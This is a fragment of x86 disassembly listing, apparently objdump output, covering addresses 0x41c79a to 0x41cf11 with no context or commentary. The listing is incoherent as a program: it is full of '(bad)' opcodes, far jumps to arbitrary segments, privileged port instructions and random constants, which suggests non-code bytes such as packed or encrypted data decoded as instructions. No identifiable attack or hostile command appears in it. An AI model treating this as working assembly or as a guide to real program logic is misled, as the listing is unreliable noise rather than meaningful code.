  41c79a:	mov    edx,DWORD PTR [eax+0x33]
  41c79d:	out    dx,eax
  41c79e:	inc    edi
  41c79f:	inc    ecx
  41c7a0:	ror    edi,0xa8
  41c7a3:	pop    edi
  41c7a4:	mov    eax,ds:0x6f90fbb
  41c7a9:	and    DWORD PTR ds:0x8a3bef22,0x7c
  41c7b0:	lock or ebp,DWORD PTR [ebp+0x7a596058]
  41c7b7:	scas   al,BYTE PTR es:[edi]
  41c7b8:	cmp    al,0xe1
  41c7ba:	aam    0xcf
  41c7bc:	xchg   ebp,eax
  41c7bd:	push   ecx
  41c7be:	inc    eax
  41c7bf:	cmc    
  41c7c0:	mov    al,0x64
  41c7c2:	sbb    edi,DWORD PTR [eax+0x9]
  41c7c5:	adc    al,BYTE PTR [edx+0x2bdd826d]
  41c7cb:	xor    dh,bh
  41c7cd:	push   0xb3f5385f
  41c7d2:	lods   eax,DWORD PTR ds:[esi]
  41c7d3:	cmp    BYTE PTR [ebp+0x7b],cl
  41c7d6:	jmp    0x9c93:0x64960eed
  41c7dd:	cmp    dl,dl
  41c7df:	(bad)  
  41c7e0:	mov    ch,0xb9
  41c7e2:	add    BYTE PTR [esi],dl
  41c7e4:	jo     0x41c7a3
  41c7e6:	and    DWORD PTR [eax-0x65],edx
  41c7e9:	mov    ds:0xcb373fa,eax
  41c7ee:	daa    
  41c7ef:	add    eax,0xe820e66d
  41c7f4:	movaps XMMWORD PTR [edx+eax*4-0x2ec0801a],xmm6
  41c7fc:	popf   
  41c7fd:	dec    ebx
  41c7fe:	inc    eax
  41c7ff:	pushf  
  41c800:	adc    al,ah
  41c802:	retf   
  41c803:	stos   BYTE PTR es:[edi],al
  41c804:	out    dx,al
  41c805:	inc    ebp
  41c806:	scas   eax,DWORD PTR es:[edi]
  41c807:	jb     0x41c852
  41c809:	add    ch,BYTE PTR [ebx-0x7d78c89c]
  41c80f:	call   0x2be0:0x3eeb4c51
  41c816:	or     BYTE PTR [esi+0x30],cl
  41c819:	and    ch,BYTE PTR [eax-0xe]
  41c81c:	jecxz  0x41c891
  41c81e:	jmp    0x41c843
  41c820:	or     al,0xc5
  41c822:	gs push ecx
  41c824:	push   0xffffffd4
  41c826:	mov    ah,0xd5
  41c828:	jmp    0x41c7c2
  41c82a:	fs dec esi
  41c82c:	aas    
  41c82d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c82e:	into   
  41c82f:	cmp    al,BYTE PTR [ecx+0x558528f3]
  41c835:	daa    
  41c836:	into   
  41c837:	jae    0x41c84a
  41c839:	xrelease mov DWORD PTR [eax+eax*2+0x75fafff0],esi
  41c841:	and    esi,DWORD PTR [ebp+0x2c4dc862]
  41c847:	push   ss
  41c848:	mov    esp,0xe6ad444
  41c84d:	(bad)  
  41c84e:	or     DWORD PTR [ebx],edi
  41c850:	fdiv   QWORD PTR [edx-0x77]
  41c853:	jg     0x41c85a
  41c855:	jecxz  0x41c8b0
  41c857:	ror    BYTE PTR [ecx-0x5a027a1d],1
  41c85d:	lahf   
  41c85e:	pop    ebp
  41c85f:	fs (bad) 
  41c861:	pop    esp
  41c862:	loope  0x41c86a
  41c864:	lods   eax,DWORD PTR ds:[esi]
  41c865:	inc    esp
  41c866:	and    eax,0xb7a77805
  41c86b:	enter  0xbf81,0x50
  41c86f:	jmp    0x41c8a0
  41c871:	sbb    al,0xff
  41c873:	xchg   ebx,eax
  41c874:	sub    BYTE PTR [ebx+0x77],dh
  41c877:	mov    al,0x5a
  41c879:	sub    ecx,ecx
  41c87b:	ss xchg edx,eax
  41c87d:	jbe    0x41c808
  41c87f:	int    0xfd
  41c881:	out    0x14,al
  41c883:	in     eax,0xae
  41c885:	retf   0x842e
  41c888:	fnstenv [edx]
  41c88a:	sub    edx,DWORD PTR [eax+0x45]
  41c88d:	adc    al,0x94
  41c88f:	cmpxchg DWORD PTR [ebx+edi*8+0x44],esi
  41c894:	into   
  41c895:	mov    bh,0x5c
  41c897:	mov    cl,0xd
  41c899:	popf   
  41c89a:	or     esi,DWORD PTR [eax]
  41c89c:	sbb    DWORD PTR [edi+0x32],0xffffffa2
  41c8a0:	pop    edx
  41c8a1:	out    0x86,al
  41c8a3:	fs sbb eax,0xfba369a9
  41c8a9:	xchg   DWORD PTR [eax-0x72],edx
  41c8ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c8ad:	aam    0x14
  41c8af:	aas    
  41c8b0:	mov    bh,0xbd
  41c8b2:	mov    DWORD PTR [edx-0x26],ecx
  41c8b5:	mov    al,dl
  41c8b7:	cmp    eax,0x6c7d0ab5
  41c8bc:	push   es
  41c8bd:	(bad)  
  41c8be:	cld    
  41c8bf:	mov    ds:0x32dcff2e,eax
  41c8c4:	cmp    esi,ebp
  41c8c6:	loope  0x41c887
  41c8c8:	xlat   BYTE PTR es:[ebx]
  41c8ca:	loop   0x41c87d
  41c8cc:	jl     0x41c896
  41c8ce:	or     al,0x72
  41c8d0:	or     eax,0x1dfe0178
  41c8d5:	xchg   DWORD PTR gs:[edi],esp
  41c8d8:	aam    0x3e
  41c8da:	adc    DWORD PTR [ecx+edx*8-0x6417c08],edx
  41c8e1:	les    edx,FWORD PTR [ebx-0x3c]
  41c8e4:	daa    
  41c8e5:	shl    DWORD PTR [ecx-0x2a],0xe9
  41c8e9:	out    dx,al
  41c8ea:	fadd   QWORD PTR [eax]
  41c8ec:	pop    edi
  41c8ed:	leave  
  41c8ee:	aam    0x82
  41c8f0:	xchg   edx,eax
  41c8f1:	outs   dx,BYTE PTR ds:[esi]
  41c8f2:	mov    WORD PTR [esi+eax*4-0x4a],ss
  41c8f6:	(bad)  
  41c8f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c8f8:	test   eax,0xe07736c4
  41c8fd:	xor    ch,BYTE PTR fs:[eax+0x18]
  41c901:	adc    esi,DWORD PTR [eax-0x18d74516]
  41c907:	nop
  41c908:	mov    ebp,0xdfa7e34c
  41c90d:	lods   eax,DWORD PTR ds:[esi]
  41c90e:	push   edi
  41c90f:	popf   
  41c910:	jmp    0x41c95e
  41c912:	sbb    BYTE PTR [edx],bh
  41c914:	ds xchg ebx,eax
  41c916:	xor    al,0xe3
  41c918:	aad    0xc4
  41c91a:	mov    eax,0xfabbebcf
  41c91f:	test   al,0xa
  41c921:	fisttp WORD PTR [esi-0x15]
  41c924:	shr    BYTE PTR [ebx+0x17674842],1
  41c92a:	stos   BYTE PTR es:[edi],al
  41c92b:	add    BYTE PTR [ebp+0x11],0xb0
  41c92f:	add    BYTE PTR [ecx-0x34491706],bh
  41c935:	hlt    
  41c936:	inc    BYTE PTR [eax+0x489363b0]
  41c93c:	nop
  41c93d:	stos   BYTE PTR es:[edi],al
  41c93e:	add    al,0xd3
  41c940:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c941:	add    BYTE PTR [esi+0x52],ch
  41c944:	mov    ds:0x311529e7,al
  41c949:	push   cs
  41c94a:	xorps  xmm7,XMMWORD PTR ds:0xf3a11edb
  41c951:	cmp    ebp,DWORD PTR [eax-0x4a]
  41c954:	sbb    DWORD PTR [edx],esi
  41c956:	inc    ecx
  41c957:	test   al,0x6f
  41c959:	mov    edx,0x93e7513a
  41c95e:	xor    edi,edx
  41c960:	pop    edi
  41c961:	add    dh,ah
  41c963:	js     0x41c999
  41c965:	sub    eax,ebp
  41c967:	pop    ecx
  41c968:	lahf   
  41c969:	xor    esp,ebx
  41c96b:	cmp    BYTE PTR [edi+edx*2-0x74],0x96
  41c970:	sahf   
  41c971:	repnz cmp al,0x15
  41c974:	add    dh,0x2d
  41c977:	leave  
  41c978:	jne    0x41c9f4
  41c97a:	mov    eax,0x778f7810
  41c97f:	cmp    ah,al
  41c981:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c982:	jae    0x41c97e
  41c984:	fsub   QWORD PTR [ecx-0x7ade657f]
  41c98a:	jnp    0x41c9c6
  41c98c:	jmp    0xc501811
  41c991:	das    
  41c992:	add    eax,0x26b83788
  41c997:	push   ebx
  41c998:	add    bl,ah
  41c99a:	adc    edi,esp
  41c99c:	mov    ah,0x35
  41c99e:	stos   BYTE PTR es:[edi],al
  41c99f:	leave  
  41c9a0:	lods   eax,DWORD PTR ds:[esi]
  41c9a1:	sbb    ebx,esi
  41c9a3:	dec    edi
  41c9a4:	hlt    
  41c9a5:	fcom   DWORD PTR [ebx]
  41c9a7:	sbb    eax,0xd0bd3680
  41c9ac:	and    eax,0x786be9e7
  41c9b1:	inc    edx
  41c9b2:	and    DWORD PTR [ebx+0x411b4925],ebp
  41c9b8:	call   0xdfda:0x36a20ee0
  41c9bf:	xor    ah,BYTE PTR [edx+0x5e410b21]
  41c9c5:	sbb    eax,0x9b70829d
  41c9ca:	in     eax,dx
  41c9cb:	mov    ah,0xfd
  41c9cd:	add    BYTE PTR [ebx+edi*8+0x0],dh
  41c9d1:	jmp    0x41c95d
  41c9d3:	or     al,0xe0
  41c9d5:	cmp    al,0xe0
  41c9d7:	call   0xfb1a:0xc330c1f2
  41c9de:	(bad)  
  41c9df:	mov    al,0xfb
  41c9e1:	cwde   
  41c9e2:	xchg   BYTE PTR [edx-0x5c],cl
  41c9e5:	add    eax,0x2c4161f6
  41c9ea:	pop    DWORD PTR [eax+0x58]
  41c9ed:	add    DWORD PTR [esi],ebp
  41c9ef:	mov    esi,0xd95b7fc0
  41c9f4:	adc    esi,DWORD PTR [esi-0x43]
  41c9f7:	cmp    ebx,DWORD PTR [ebx+0x50a9945e]
  41c9fd:	mov    BYTE PTR ds:0x8989a746,cl
  41ca03:	pusha  
  41ca04:	dec    eax
  41ca05:	mov    BYTE PTR [edx],dh
  41ca07:	sti    
  41ca08:	xor    edx,DWORD PTR ds:0x673ec287
  41ca0e:	sbb    bh,ch
  41ca10:	push   cs
  41ca11:	push   esp
  41ca12:	mov    edi,0x4ff9bdee
  41ca17:	lea    edx,[edx-0x62]
  41ca1a:	iret   
  41ca1b:	mov    bl,0x77
  41ca1d:	mov    al,ds:0x63ea2b8d
  41ca22:	je     0x41c9df
  41ca24:	and    eax,0xc4241fa7
  41ca29:	arpl   WORD PTR [ebp-0x61],sp
  41ca2c:	sar    DWORD PTR [eax+0x6d041f61],cl
  41ca32:	cmp    DWORD PTR [edi],eax
  41ca34:	mov    eax,ds:0xf7b2f62a
  41ca39:	pop    ss
  41ca3a:	aaa    
  41ca3b:	rcl    BYTE PTR [edx-0x20],0xeb
  41ca3f:	imul   edx,DWORD PTR [eax+0x2716b871],0xf3a363f
  41ca49:	aad    0x6d
  41ca4b:	cmp    dl,ah
  41ca4d:	mov    edi,0xc18cdcdf
  41ca52:	outs   dx,DWORD PTR ds:[esi]
  41ca53:	mov    cl,BYTE PTR [eax+ebx*1-0x687e132b]
  41ca5a:	cmp    edx,DWORD PTR [ebp+0x1d]
  41ca5d:	mov    ds:0x7748182c,al
  41ca62:	rcl    BYTE PTR [ecx+0x5d8f7a49],1
  41ca68:	cmp    al,0x3a
  41ca6a:	mov    cl,0x97
  41ca6c:	sbb    cl,bl
  41ca6e:	adc    eax,0x2073d749
  41ca73:	pop    ebx
  41ca74:	push   0x5e7542a3
  41ca79:	ret    
  41ca7a:	sub    DWORD PTR [ebp+edi*2-0x45],esp
  41ca7e:	dec    esi
  41ca7f:	aam    0x16
  41ca81:	pop    ebp
  41ca82:	jb     0x41caa0
  41ca84:	(bad)  
  41ca85:	jg     0x41ca31
  41ca87:	sti    
  41ca88:	in     eax,dx
  41ca89:	adc    DWORD PTR [ecx+eiz*2+0x77],ebx
  41ca8d:	xor    eax,0xbbb8c643
  41ca92:	cwde   
  41ca93:	ret    
  41ca94:	push   edx
  41ca95:	sub    cl,BYTE PTR [esi-0x3]
  41ca98:	int3   
  41ca99:	xchg   edi,eax
  41ca9a:	cmp    ebp,edx
  41ca9c:	ror    BYTE PTR [esi+0x2e],1
  41ca9f:	les    eax,FWORD PTR [ebx-0x19]
  41caa2:	adc    eax,0x5fb0387f
  41caa7:	dec    ebx
  41caa8:	sahf   
  41caa9:	xor    al,BYTE PTR [ecx-0x3]
  41caac:	int    0xb8
  41caae:	mov    ds:0x3ea7d511,al
  41cab3:	mov    dl,0x17
  41cab5:	leave  
  41cab6:	mov    dl,0x8a
  41cab8:	cli    
  41cab9:	ins    DWORD PTR es:[edi],dx
  41caba:	pop    esi
  41cabb:	rcl    ch,0x53
  41cabe:	sbb    DWORD PTR [esp+ebp*2+0x214707fb],esi
  41cac5:	nop
  41cac6:	repz fnstenv [esi]
  41cac9:	adc    DWORD PTR [ecx-0x7b937dbf],ecx
  41cacf:	std    
  41cad0:	pop    esi
  41cad1:	xchg   edi,eax
  41cad2:	clc    
  41cad3:	(bad)  
  41cad4:	in     al,0x8
  41cad6:	les    edi,FWORD PTR [ebx+0x16]
  41cad9:	sar    ch,cl
  41cadb:	outs   dx,DWORD PTR ds:[esi]
  41cadc:	pop    esi
  41cadd:	sbb    eax,0x91af33aa
  41cae2:	inc    ecx
  41cae3:	and    DWORD PTR [edi],esp
  41cae5:	lods   al,BYTE PTR ds:[esi]
  41cae6:	push   0xd97ae768
  41caeb:	mov    cl,0x4f
  41caed:	sub    bl,BYTE PTR [ecx]
  41caef:	ins    BYTE PTR es:[edi],dx
  41caf0:	xor    bl,BYTE PTR [edi-0x5af745e8]
  41caf6:	push   es
  41caf7:	inc    edi
  41caf8:	lock push ds
  41cafa:	adc    bl,BYTE PTR [edi+0x33f9d498]
  41cb00:	in     eax,dx
  41cb01:	push   eax
  41cb02:	jl     0x41cadd
  41cb04:	inc    ebp
  41cb05:	adc    bh,BYTE PTR [esi+ecx*1-0x64]
  41cb09:	or     eax,0x859fc99b
  41cb0e:	imul   ecx,DWORD PTR [ebx-0x74],0xffffff93
  41cb12:	push   edx
  41cb13:	inc    esi
  41cb14:	inc    eax
  41cb15:	push   edx
  41cb16:	pushf  
  41cb17:	adc    bl,BYTE PTR [ecx-0x390d8cf3]
  41cb1d:	or     BYTE PTR [ebp+0x43],dl
  41cb20:	sbb    al,BYTE PTR [ebx+0x2798b976]
  41cb26:	xchg   BYTE PTR ds:0xf3ed816c,ah
  41cb2c:	dec    ecx
  41cb2d:	mov    al,0x18
  41cb2f:	ret    
  41cb30:	test   eax,ecx
  41cb32:	mov    ch,0x34
  41cb34:	mov    DWORD PTR [edi-0x71],0x21366ba4
  41cb3b:	pop    ebx
  41cb3c:	push   eax
  41cb3d:	and    BYTE PTR [ebx-0x27],0xd0
  41cb41:	addr16 std 
  41cb43:	or     eax,0x1b364d1a
  41cb48:	mov    ch,0xe4
  41cb4a:	(bad)  
  41cb4b:	mov    bh,BYTE PTR [esi+0x623a0f9a]
  41cb51:	jb     0x41cbca
  41cb53:	scas   eax,DWORD PTR es:[edi]
  41cb54:	dec    edx
  41cb55:	inc    eax
  41cb56:	cdq    
  41cb57:	call   0xc7ef41f1
  41cb5c:	sub    DWORD PTR [eax],eax
  41cb5e:	mov    ah,0xa2
  41cb60:	mov    ds:0x349795b6,eax
  41cb65:	xchg   edi,eax
  41cb66:	mov    cl,0x9d
  41cb68:	sub    BYTE PTR [ecx-0xe348e89],dl
  41cb6e:	xchg   DWORD PTR [eax+0x4e69c148],edi
  41cb74:	imul   esp,ecx,0x8a7b308c
  41cb7a:	xor    dh,0x9e
  41cb7d:	mov    ds:0x25d1d10f,al
  41cb82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb83:	ror    eax,1
  41cb85:	cdq    
  41cb86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb87:	fadd   QWORD PTR [edx+0x26]
  41cb8a:	add    bh,cl
  41cb8c:	push   ebx
  41cb8d:	adc    bh,bh
  41cb8f:	push   edi
  41cb90:	jno    0x41cbc2
  41cb92:	sbb    al,0xe3
  41cb94:	arpl   WORD PTR [ecx],dx
  41cb96:	xor    DWORD PTR [ebp-0x30],ecx
  41cb99:	push   edi
  41cb9a:	or     DWORD PTR [ebp-0x69],edi
  41cb9d:	jecxz  0x41cb79
  41cb9f:	push   ecx
  41cba0:	mov    ds:0xceb99d80,eax
  41cba5:	pop    DWORD PTR [edx-0x696dccc7]
  41cbab:	and    DWORD PTR [eax],esi
  41cbad:	outs   dx,DWORD PTR ds:[esi]
  41cbae:	or     ecx,DWORD PTR [edi+0x7d]
  41cbb1:	test   al,0xe7
  41cbb3:	mov    esp,DWORD PTR [eax]
  41cbb5:	sub    dl,ah
  41cbb7:	(bad)  
  41cbb8:	int3   
  41cbb9:	lods   eax,DWORD PTR ds:[esi]
  41cbba:	inc    ebp
  41cbbb:	push   edi
  41cbbc:	(bad)  
  41cbbe:	ficomp DWORD PTR [ecx]
  41cbc0:	lds    ebx,FWORD PTR [edi+eax*1+0x1d896208]
  41cbc7:	into   
  41cbc8:	cmc    
  41cbc9:	dec    ebx
  41cbca:	xchg   esp,eax
  41cbcb:	mov    edi,0xeddb65e5
  41cbd0:	idiv   DWORD PTR [edx+0x67ba8822]
  41cbd6:	jp     0x41cbd2
  41cbd8:	callw  0x4eb1
  41cbdc:	mov    dl,0xa2
  41cbde:	bswap  eax
  41cbe0:	test   eax,0x260dfebf
  41cbe5:	adc    al,0x26
  41cbe7:	hlt    
  41cbe8:	jnp    0x41cc26
  41cbea:	sti    
  41cbeb:	sub    esi,DWORD PTR [edi-0x5e]
  41cbee:	fcom   st(4)
  41cbf0:	std    
  41cbf1:	xchg   ecx,eax
  41cbf2:	cdq    
  41cbf3:	jl     0x41cb8b
  41cbf5:	nop
  41cbf6:	add    esi,esi
  41cbf8:	add    esp,DWORD PTR [eax+0x2867d81]
  41cbfe:	ret    
  41cbff:	mov    bl,0xe7
  41cc01:	(bad)  
  41cc02:	dec    edx
  41cc03:	or     bh,ah
  41cc05:	jmp    0x5dde517f
  41cc0a:	jbe    0x41cc2f
  41cc0c:	das    
  41cc0d:	push   es
  41cc0e:	imul   esi,ebp,0xa4066264
  41cc14:	test   ecx,edi
  41cc16:	mov    esi,0xad2ae524
  41cc1b:	ja     0x41cc36
  41cc1d:	ds mov al,0xd8
  41cc20:	push   cs
  41cc21:	es stc 
  41cc23:	mov    edx,0x76b6bd30
  41cc28:	jecxz  0x41cbd7
  41cc2a:	mov    ebx,0x555dca69
  41cc2f:	jge    0x41cc89
  41cc31:	mov    ch,BYTE PTR [ebx-0x1f826293]
  41cc37:	aam    0x55
  41cc39:	fist   WORD PTR [ebx]
  41cc3b:	jae    0x41cc57
  41cc3d:	and    al,0x82
  41cc3f:	bound  esi,QWORD PTR [edi-0x519ea5a3]
  41cc45:	fbstp  TBYTE PTR [ebp+0x30]
  41cc48:	sbb    esp,ebp
  41cc4a:	mov    al,ds:0x184450f0
  41cc4f:	(bad)  [edi+edx*1-0x23]
  41cc53:	out    0xde,eax
  41cc55:	dec    ecx
  41cc56:	repz dec ebp
  41cc58:	dec    ebp
  41cc59:	(bad)  
  41cc5a:	call   0x32b7:0x72762e26
  41cc61:	bound  edx,QWORD PTR [edx+0x17]
  41cc64:	or     eax,DWORD PTR [edi]
  41cc66:	stos   BYTE PTR es:[edi],al
  41cc67:	sub    bl,BYTE PTR [ebx]
  41cc69:	scas   al,BYTE PTR es:[edi]
  41cc6a:	adc    DWORD PTR [edi],ebp
  41cc6c:	push   ebp
  41cc6d:	test   edx,ebx
  41cc6f:	jge    0x41cc84
  41cc71:	sahf   
  41cc72:	mov    ecx,0x192f9995
  41cc77:	pcmpeqw mm2,mm6
  41cc7a:	push   cs
  41cc7b:	or     eax,0x72bf3b6c
  41cc80:	jl     0x41cc78
  41cc82:	mov    ebx,0xe274877d
  41cc87:	ss (bad) 
  41cc89:	or     eax,0x932fb8c5
  41cc8e:	sahf   
  41cc8f:	mov    cl,bh
  41cc91:	mov    al,ds:0x17ab9b05
  41cc96:	clc    
  41cc97:	adc    bh,BYTE PTR [esi-0x56]
  41cc9a:	test   al,0x90
  41cc9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc9d:	and    eax,DWORD PTR [ebx]
  41cc9f:	or     esi,eax
  41cca1:	xlat   BYTE PTR ds:[ebx]
  41cca2:	or     DWORD PTR ds:0x51b16452,esi
  41cca8:	mov    eax,ds:0xfc1d7ffe
  41ccad:	sbb    DWORD PTR [ebx+0x494a1fb2],edx
  41ccb3:	inc    eax
  41ccb4:	xor    al,0x6b
  41ccb6:	les    esp,FWORD PTR [eax-0x40]
  41ccb9:	loope  0x41ccf4
  41ccbb:	xchg   esi,eax
  41ccbc:	xchg   edi,eax
  41ccbd:	and    BYTE PTR [ebx+0x98a64b8],bh
  41ccc3:	mov    edi,0xc92098f4
  41ccc8:	xor    BYTE PTR [esi],ah
  41ccca:	xor    eax,0x7f191ebc
  41cccf:	sbb    DWORD PTR ds:[eax],0xfffffff8
  41ccd3:	add    BYTE PTR [eax-0x3a],bl
  41ccd6:	out    dx,eax
  41ccd7:	sbb    ebx,DWORD PTR [ebp-0x76f0761d]
  41ccdd:	sbb    BYTE PTR [edi-0x5b7b4b62],bh
  41cce3:	and    al,0x47
  41cce5:	xchg   ebp,eax
  41cce6:	mov    dl,0x10
  41cce8:	jnp    0x41ccb3
  41ccea:	jo     0x41cd2f
  41ccec:	mov    bl,0x89
  41ccee:	popa   
  41ccef:	shl    edi,0xd6
  41ccf2:	mov    es:0xf0f03c8d,al
  41ccf8:	push   0x16
  41ccfa:	push   cs
  41ccfb:	jno    0x41ccd9
  41ccfd:	test   al,0xa5
  41ccff:	and    bh,BYTE PTR [ebp-0x62]
  41cd02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd03:	cmp    ecx,edx
  41cd05:	rcl    DWORD PTR [ecx+0x40ed1ad8],1
  41cd0b:	mov    cl,0x54
  41cd0e:	outs   dx,BYTE PTR ds:[esi]
  41cd0f:	das    
  41cd10:	add    BYTE PTR [ecx+0x82e46a2],al
  41cd16:	iret   
  41cd17:	cmp    eax,0x4c018c26
  41cd1c:	push   cs
  41cd1d:	scas   eax,DWORD PTR es:[edi]
  41cd1e:	add    dl,bl
  41cd20:	(bad)  
  41cd21:	mov    ah,0x46
  41cd23:	repnz mov ds,WORD PTR [esp+ecx*2-0x78]
  41cd28:	repnz push ds
  41cd2a:	push   0xdb8feda1
  41cd2f:	or     al,0x46
  41cd31:	fcom   DWORD PTR [esi+0x7205be9b]
  41cd37:	cdq    
  41cd38:	int    0x44
  41cd3a:	inc    eax
  41cd3b:	popa   
  41cd3c:	sbb    dh,bl
  41cd3e:	xchg   ecx,eax
  41cd3f:	out    0x3a,al
  41cd41:	fld    TBYTE PTR [edx-0x78]
  41cd44:	lds    edi,FWORD PTR [edi-0x4344dab0]
  41cd4a:	paddd  mm0,QWORD PTR [edi-0x6d4445]
  41cd51:	jl     0x41cd56
  41cd53:	ret    0x50ae
  41cd56:	imul   esp,DWORD PTR [ebx+edi*1-0x21],0x60
  41cd5b:	inc    edi
  41cd5c:	cmp    BYTE PTR [ebp+0x52],ah
  41cd5f:	push   ecx
  41cd60:	xchg   ebp,eax
  41cd61:	out    dx,eax
  41cd62:	loopne 0x41cdce
  41cd64:	aad    0x35
  41cd66:	scas   al,BYTE PTR es:[edi]
  41cd67:	dec    eax
  41cd68:	sub    edi,DWORD PTR [edi]
  41cd6a:	xchg   esi,eax
  41cd6b:	jns    0x41cd6b
  41cd6d:	(bad)  
  41cd6e:	fnstcw WORD PTR [edx-0x52]
  41cd71:	(bad)  
  41cd73:	cld    
  41cd74:	pop    ds
  41cd75:	clc    
  41cd76:	adc    edx,DWORD PTR [esi+0x3d5a5866]
  41cd7c:	jo     0x41cd74
  41cd7e:	pop    ss
  41cd7f:	mov    eax,ds:0x259e87a6
  41cd84:	loop   0x41cd33
  41cd86:	(bad)  [ebp+0x73]
  41cd89:	mov    ch,0x2e
  41cd8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd8c:	mov    esp,0x1cd80f71
  41cd91:	repz jp 0x41cdc9
  41cd94:	pop    ebx
  41cd95:	mov    al,ds:0x5df93d62
  41cd9a:	and    DWORD PTR [eax-0x6],edi
  41cd9d:	pop    esp
  41cd9e:	cli    
  41cd9f:	enter  0x8d11,0xe8
  41cda3:	loop   0x41cd60
  41cda5:	xchg   cl,cl
  41cda7:	neg    BYTE PTR [ecx+0x2cadeab0]
  41cdad:	mov    bl,BYTE PTR [ebp-0x18]
  41cdb0:	xchg   edi,eax
  41cdb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cdb2:	inc    esi
  41cdb3:	cli    
  41cdb4:	aam    0x50
  41cdb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cdb8:	cmp    WORD PTR [edx-0x39722aed],ax
  41cdbf:	js     0x41cd41
  41cdc1:	pop    eax
  41cdc2:	mov    ds,edi
  41cdc4:	mov    ecx,0xad813b04
  41cdc9:	mov    ecx,0xbf6df9fa
  41cdce:	xchg   ecx,eax
  41cdcf:	inc    ecx
  41cdd0:	rol    BYTE PTR [esi+0x384dce14],1
  41cdd6:	cmp    al,0xc2
  41cdd8:	jb     0x41cd97
  41cdda:	arpl   dx,bp
  41cddc:	into   
  41cddd:	shl    DWORD PTR [edx-0x28d0161],0x74
  41cde4:	sub    DWORD PTR [eax+0x6b],eax
  41cde7:	fnstcw WORD PTR [edx]
  41cde9:	outs   dx,BYTE PTR ds:[esi]
  41cdea:	and    esi,DWORD PTR [edi-0x4e2af652]
  41cdf0:	mov    ds:0x2cae333d,al
  41cdf5:	outs   dx,DWORD PTR ds:[esi]
  41cdf6:	adc    DWORD PTR [edx+0x28d49138],esi
  41cdfc:	aam    0x79
  41cdfe:	ins    DWORD PTR es:[edi],dx
  41cdff:	inc    eax
  41ce00:	mov    al,0x40
  41ce02:	jno    0x41cdbc
  41ce04:	adc    al,0x64
  41ce06:	out    0x82,al
  41ce08:	stos   DWORD PTR es:[edi],eax
  41ce09:	mov    edx,0x82a674bd
  41ce0e:	fsubr  st(7),st
  41ce10:	adc    al,0xf9
  41ce12:	and    DWORD PTR [ebp-0x61],edx
  41ce15:	or     al,BYTE PTR [esp+ebp*4]
  41ce18:	mov    al,0xe7
  41ce1a:	dec    eax
  41ce1b:	cdq    
  41ce1c:	dec    esp
  41ce1d:	push   es
  41ce1e:	push   0xffffffe7
  41ce20:	xchg   ebp,eax
  41ce21:	in     eax,0x66
  41ce23:	sti    
  41ce24:	jne    0x41cdc6
  41ce26:	inc    edx
  41ce27:	mov    bl,BYTE PTR [ebp-0x52]
  41ce2a:	jae    0x41ce91
  41ce2c:	pushf  
  41ce2d:	sahf   
  41ce2e:	jmp    0x6c0c2548
  41ce33:	stos   DWORD PTR es:[edi],eax
  41ce34:	mov    bh,0xbf
  41ce36:	fwait
  41ce37:	ret    0x3af8
  41ce3a:	dec    edi
  41ce3b:	push   ebx
  41ce3c:	push   0x69908948
  41ce41:	pop    esp
  41ce42:	jmp    0x41ceaa
  41ce44:	pop    ebx
  41ce45:	sub    ecx,DWORD PTR ds:0xcd7f03ce
  41ce4b:	icebp  
  41ce4c:	cmp    eax,esp
  41ce4e:	shl    DWORD PTR cs:[edx+0x2b26c79c],0xd3
  41ce56:	sbb    DWORD PTR [edx+0x36f32642],0x60
  41ce5d:	test   DWORD PTR [ecx+0x735f1d08],0x8e72e45b
  41ce67:	push   eax
  41ce68:	jmp    0x525d928b
  41ce6d:	push   esi
  41ce6e:	rol    BYTE PTR [esi+edx*4+0x5a],1
  41ce72:	repz inc ebp
  41ce74:	cmc    
  41ce75:	mov    esi,0x5ec4cbf0
  41ce7a:	repnz test eax,0xbb00d367
  41ce80:	sbb    eax,0xf3b2b66b
  41ce85:	mov    dl,0xeb
  41ce87:	jp     0x41cefe
  41ce89:	and    DWORD PTR [ebp+0xc5626ff],esi
  41ce8f:	dec    esp
  41ce90:	in     eax,0x52
  41ce92:	js     0x41cea0
  41ce94:	pop    eax
  41ce95:	mov    dl,0x5b
  41ce97:	sbb    ah,cl
  41ce99:	data16 stc 
  41ce9b:	outs   dx,BYTE PTR ds:[esi]
  41ce9c:	mov    DWORD PTR [ebp*1-0xc638f9b],0xdcaa1d4f
  41cea7:	mov    ebx,0x1f83005b
  41ceac:	frstor [ebx-0x52795c34]
  41ceb2:	rol    DWORD PTR [ebx+0xfd19b2d],0x3e
  41ceb9:	adc    ebx,DWORD PTR [eax+0x76335365]
  41cebf:	pop    ebp
  41cec0:	jmp    0x41cf08
  41cec2:	lods   al,BYTE PTR ds:[esi]
  41cec3:	lea    esp,[ecx]
  41cec5:	xchg   ecx,eax
  41cec6:	mov    ebx,ebx
  41cec8:	inc    edi
  41cec9:	jmp    0xa02d5488
  41cece:	in     eax,dx
  41cecf:	or     ebp,esi
  41ced1:	inc    ebx
  41ced2:	ret    0xda13
  41ced5:	lahf   
  41ced6:	adc    eax,0x4035c26c
  41cedb:	ja     0x41cf22
  41cedd:	inc    ebx
  41cede:	xlat   BYTE PTR ds:[ebx]
  41cedf:	loope  0x41cf3e
  41cee1:	or     al,al
  41cee3:	mov    esi,0xdc58e6be
  41cee8:	mov    eax,ds:0xc9537c31
  41ceed:	mov    dh,0xe7
  41ceef:	sar    BYTE PTR ds:[ebx+eiz*2],cl
  41cef3:	xor    ah,0xee
  41cef6:	jo     0x41cef9
  41cef8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cef9:	lea    esp,[eax]
  41cefb:	sub    al,0x2a
  41cefd:	enter  0x9393,0x3f
  41cf01:	or     DWORD PTR [ebx],eax
  41cf03:	mov    dl,0x60
  41cf05:	mov    eax,ds:0xce5b7abd
  41cf0a:	(bad)  
  41cf0b:	mov    BYTE PTR [ebx+0x1ba057cb],cl
  41cf11:	neg    ah
